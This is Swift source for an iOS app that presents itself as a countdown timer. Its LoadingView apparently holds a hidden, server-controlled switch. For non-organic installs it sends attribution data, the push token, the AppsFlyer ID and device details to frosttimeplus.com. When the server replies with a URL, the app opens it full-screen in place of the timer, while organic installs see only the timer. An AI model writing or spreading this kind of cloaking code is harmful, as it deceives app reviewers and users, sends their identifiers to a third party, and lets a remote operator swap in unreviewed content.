import SwiftUI
import Network
import Combine

final class NetworkMonitor: ObservableObject {
    static let shared = NetworkMonitor()
    
    @Published private(set) var isDisconnected: Bool = false
    
    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue(label: "NetworkMonitorQueue")
    
    private init() {
        monitor.pathUpdateHandler = { [weak self] path in
            DispatchQueue.main.async {
                self?.isDisconnected = (path.status != .satisfied)
            }
        }
        monitor.start(queue: queue)
    }
}

import SwiftUI

extension View {
    func outlineText(color: Color, width: CGFloat) -> some View {
        modifier(StrokeModifier(strokeSize: width, strokeColor: color))
    }
}

struct StrokeModifier: ViewModifier {
    private let id = UUID()
    var strokeSize: CGFloat = 1
    var strokeColor: Color = .blue
    
    func body(content: Content) -> some View {
        content
            .padding(strokeSize*2)
            .background (Rectangle()
                .foregroundStyle(strokeColor)
                .mask({
                    outline(context: content)
                })
            )}
    
    func outline(context:Content) -> some View {
        Canvas { context, size in
            context.addFilter(.alphaThreshold(min: 0.01))
            context.drawLayer { layer in
                if let text = context.resolveSymbol(id: id) {
                    layer.draw(text, at: .init(x: size.width/2, y: size.height/2))
                }
            }
        } symbols: {
            context.tag(id)
                .blur(radius: strokeSize)
        }
    }
}

struct URLModel: Identifiable, Equatable {
    let id = UUID()
    let urlString: String
}

struct LoadingView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var hasCheckedAuthorization = false
    @State  var url: URLModel? = nil
    @Environment(\.verticalSizeClass) var verticalSizeClass
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
    @State var conversionDataReceived: Bool = false
    @State var isNotif = false
    let lastDeniedKey = "lastNotificationDeniedDate"
    let configExpiresKey = "config_expires"
    let configUrlKey = "config_url"
    let configNoMoreRequestsKey = "config_no_more_requests"
    @State var isMain = false
    @State  var isRequestingConfig = false
    @StateObject  var networkMonitor = NetworkMonitor.shared
    @State var isInet = false
    @State private var hasHandledConversion = false
    
    var isPortrait: Bool {
        verticalSizeClass == .regular && horizontalSizeClass == .compact
    }
    
    var isLandscape: Bool {
        verticalSizeClass == .compact && horizontalSizeClass == .regular
    }
    @State var urlFromNotification: String? = nil
    
    var body: some View {
        VStack {
            if isPortrait {
                ZStack {
                    Image("loadport")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 150) {
                        Spacer()
                        
                        VStack(spacing: 30) {
                            Spacer()
                            
                            ProgressView()
                                .scaleEffect(3.0)
                                .padding(.top)
                                .tint(.white)
                            
                            Spacer()
                        }
                    }
                    .padding(.vertical, 20)
                }
            } else {
                ZStack {
                    Image("loadland")
                        .resizable()
                        .ignoresSafeArea()
                    
                    VStack(spacing: 10) {
                        Spacer()
                        
                        ProgressView()
                            .scaleEffect(3.0)
                            .tint(.white)
                    }
                    .padding(.bottom, 80)
                }
            }
        }
        .onReceive(networkMonitor.$isDisconnected) { disconnected in
            if disconnected {
                isInet = true
            } else {
            }
        }
        .fullScreenCover(item: $url) { item in
            Egg(urlString: item.urlString)
                .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
                    if let userInfo = notification.userInfo,
                       let url = userInfo["url"] as? String {
                        urlFromNotification = url
                    }
                }
                .fullScreenCover(isPresented: Binding<Bool>(
                    get: { urlFromNotification != nil },
                    set: { newValue in if !newValue { urlFromNotification = nil } }
                )) {
                    if let urlToOpen = urlFromNotification {
                        Egg(urlString: urlToOpen)
                            .ignoresSafeArea()
                    } else {
                    }
                }
                .ignoresSafeArea(.keyboard)
                .ignoresSafeArea()
        }
        .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
            if let userInfo = notification.userInfo,
               let url = userInfo["url"] as? String {
                urlFromNotification = url
            }
        }
        .fullScreenCover(isPresented: Binding<Bool>(
            get: { urlFromNotification != nil },
            set: { newValue in if !newValue { urlFromNotification = nil } }
        )) {
            if let urlToOpen = urlFromNotification {
                Egg(urlString: urlToOpen)
                    .ignoresSafeArea()
            } else {
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { notification in
            DispatchQueue.main.async {
                guard !isInet else { return }
                if !hasHandledConversion {
                    let isOrganic = UserDefaults.standard.bool(forKey: "is_organic_conversion")
                    if isOrganic {
                        isMain = true
                    } else {
                        checknotif()
                    }
                    hasHandledConversion = true
                } else {
                    print("Conversion event ignored due to recent handling")
                }
            }
        }
        
        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { notification in
            req()
        }
        .fullScreenCover(isPresented: $isNotif) {
            NotificationView()
        }
        .fullScreenCover(isPresented: $isMain) {
            RootView()
                .environmentObject(CountdownListViewModel())
                .environmentObject(SettingsViewModel())
        }
        .fullScreenCover(isPresented: $isInet) {
            NoInternet()
        }
    }
}

extension LoadingView {
    func checknotif() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            switch settings.authorizationStatus {
            case .notDetermined:
                if again() {
                    isNotif = true
                } else {
                    req()
                }
            case .denied:
                req()
            case .authorized, .provisional, .ephemeral:
                req()
            @unknown default:
                req()
            }
        }
    }
    
    func again() -> Bool {
        if let lastDenied = UserDefaults.standard.object(forKey: lastDeniedKey) as? Date {
            let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
            return lastDenied < threeDaysAgo
        }
        return true
    }
    
    func req() {
        let configNoMoreRequestsKey = "config_no_more_requests"
        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
            print("Config requests are disabled by flag, exiting sendConfigRequest")
            DispatchQueue.main.async {
                finishWithou()
            }
            return
        }

        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
            print("Conversion data not found in UserDefaults")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
            print("Failed to deserialize conversion data")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
        conversionData["bundle_id"] = "com.app.countdowntimerplus"
        conversionData["os"] = "iOS"
        conversionData["store_id"] = "6758344924"
        conversionData["locale"] = Locale.current.identifier
        conversionData["firebase_project_id"] = "739920956005"

        do {
            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
                    let url = URL(string: "https://frosttimeplus.com/config.php")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            request.httpBody = jsonData

            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("Request error: \(error)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    print("Invalid response")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    print("Server returned status code \(httpResponse.statusCode)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                if let data = data {
                    do {
                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            print("Config response JSON: \(json)")
                            DispatchQueue.main.async {
                                handleResp(json)
                            }
                        }
                    } catch {
                        print("Failed to parse response JSON: \(error)")
                        DispatchQueue.main.async {
                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                            finishWithou()
                        }
                    }
                }
            }

            task.resume()
        } catch {
            print("Failed to serialize request body: \(error)")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
        }
    }

    func handleResp(_ jsonResponse: [String: Any]) {
        if let ok = jsonResponse["ok"] as? Bool, ok,
           let url = jsonResponse["url"] as? String,
           let expires = jsonResponse["expires"] as? TimeInterval {
            UserDefaults.standard.set(url, forKey: configUrlKey)
            UserDefaults.standard.set(expires, forKey: configExpiresKey)
            UserDefaults.standard.removeObject(forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            
            guard urlFromNotification == nil else {
                return
            }
            self.url = URLModel(urlString: url)
            print("Config saved: url = \(url), expires = \(expires)")
            
        } else {
            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            print("No valid config or error received, further requests disabled")
            finishWithou()
        }
    }
    
    func finishWithou() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            isMain = true
        }
    }
}

#Preview {
    LoadingView()
}
